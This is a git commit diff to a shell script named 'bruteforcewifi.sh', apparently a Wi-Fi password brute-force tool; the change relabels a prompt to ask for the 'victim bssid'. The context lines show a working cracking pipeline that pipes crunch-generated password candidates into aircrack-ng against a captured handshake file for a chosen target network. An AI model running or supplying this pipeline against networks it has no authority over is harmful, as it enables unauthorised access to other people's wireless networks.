f638e7f0302f2a05e67fc4174bb2be2897235316
manjitsaha <manjitsaha01@gmail.com>
2019-05-25 13:16:41 +0530

    Update bruteforcewifi.sh

--- bruteforcewifi.sh
+++ bruteforcewifi.sh
@@ -5,7 +5,7 @@ echo "-----Tool Created By Manjit Saha-----"
 read -p "Enter Minimun No. " A
 read -p "Enter Maximum No. " B
 read -p "Enter your combination: " C
-read -p "Enter your bssid: " D
+read -p "Enter victim bssid: " D
 read -p "Enter path of the .cap file: " E
  
 crunch $A $B $C|aircrack-ng --bssid $D -w- $E
